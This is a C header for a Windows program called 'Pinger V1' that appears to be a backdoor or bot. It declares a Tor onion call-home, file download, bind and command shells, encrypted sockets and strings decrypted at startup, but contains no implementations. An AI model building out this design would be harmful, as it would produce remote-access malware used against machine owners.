/* =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 *                                  Pinger V1
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * Copyright (C) 2011, William H. Welna All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 *       notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 *       notice, this list of conditions and the following disclaimer in the
 *       documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY William H. Welna ''AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL William H. Welna BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 */

#ifndef __MAIN__H__
#define __MAIN__H__

#define Socket SOCKET
#define _WIN32_WINNT 0x0501

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Winbase.h>
//#include <Iphlpapi.h> 
#pragma comment(lib, "WS2_32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Shell32.lib")
//#pragma comment(lib, "Iphlpapi.lib")

#ifdef DEBUG
    #define _DMSG(message) fprintf(stderr, message);
#else
    #define _DMSG(mesage) ;
#endif

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
//#include <stdint.h>
#include "pstdint.h"

typedef struct {
	uint8_t s[255];
	uint8_t i, j;
	uint8_t key[16];
} RC4_KEY;

typedef struct {
	uint32_t k[4];
	int t;
	int rand_num;
	char mac[6];
} rand_seed;

// Pinger
int pingback(char *onion, char *agent, char *info);
int http_download(char *host, char *port, char *http_host, char *path, char *localfile, int attributes);
// Network Functions
int ipv4_connect(char *host, char *port);
int ipv4_listen(char *ip, char *port, int backlog, int family, int proto);
int ipv4_close(int sock);
int ipv4_send(int sock, char *b, int size, unsigned int timeout);
int ipv4_recv(int sock, char *b, int size, unsigned int timeout);
// Proxy Connector
int socks5_connect(char *proxy_host, char *proxy_port, char *host, char *port);
int http_connect(char *proxy_host, char *proxy_port, char *host, char *port);

// Simple Encryption
void btea(uint32_t *v, int n, uint32_t const key[4]);
uint32_t compress(char *s); // converts 4 bytes to a uint32_t
void start(); // Decrypt strings on startup

// RC4
void rc4_ksa(RC4_KEY *k, const char *keydata, int size);
void rc4_crypt(RC4_KEY *k, char *d, int size);
uint8_t rc4_prng(RC4_KEY *k);
void rc4_drop(RC4_KEY *k, int num);
int generate_key(RC4_KEY *k);

// Encrypted Sockets
int crypt_connect(RC4_KEY *k, uint32_t xxtea_key[4], int sock);
int crypt_listen(RC4_KEY *k, uint32_t xxtea_key[4], int sock);
int crypt_send(RC4_KEY *k, int sock, char *d, int len);
char *crypt_recv(RC4_KEY *k, int sock, char *d, int *len);
int crypt_printf(RC4_KEY *k, int sock, char *fmt, ...);

// Get External IP
char *getip(char *s);

// Misc
void *find(char *haystack, int haystack_size, char *needle, int needle_size);
int mycmp(char *s1, char *s2, int size);
int mylen(char *s);
void mycpy(char *d, char *s, int size);
void myzero(char *s, int size);
void mycat(char *s1, char *s2);

// Shell
void bindshell(int sock);

// Root!
void cmd_shell(int sock);

/* Export */
typedef struct {
	void (*ksa)(RC4_KEY *, const char *, int);
	void (*crypt)(RC4_KEY *, char *, int);
	void (*prng)(RC4_KEY *);
	void (*drop)(RC4_KEY *, int);
	int (*generate)(RC4_KEY *);
} rc4_export;

typedef struct {
	int (*connect)(RC4_KEY *, uint32_t *, int);
	int (*listen)(RC4_KEY *, uint32_t *, int);
	int (*send)(RC4_KEY *, int, char *, int);
	char *(*recv)(RC4_KEY *, int, char *, int *);
	int (*printf)(RC4_KEY *, int, char *, ...);
} crypt_socks_export;

typedef struct {
	void (*xxtea)(uint32_t *, int, uint32_t *);
	uint32_t (*char2uint32)(char *);
	uint32_t *keys;
} tea_export;

typedef struct {
	void *(*find)(char *, int, char *, int);
	int (*cmp)(char *, char *, int);
	int (*len)(char *);
	void (*cpy)(char *, char *, int);
	void (*zero)(char *, int);
	void (*cat)(char *, char *);
} utils_export;

typedef struct {
	int (*connect)(char *, char*);
	int (*listen)(char *, char *, int, int, int);
	int (*close)(int);
	int (*send)(int, char *, int, unsigned int);
	int (*recv)(int, char *, int, unsigned int);
	int (*socks5)(char *, char *, char *, char *);
} socks_export;

typedef struct {
	rc4_export *rc4;
	crypt_socks_export *crypt_socks;
	tea_export *tea;
	utils_export *utils;
	socks_export *socks;
} export_table;
/* Export */
#endif
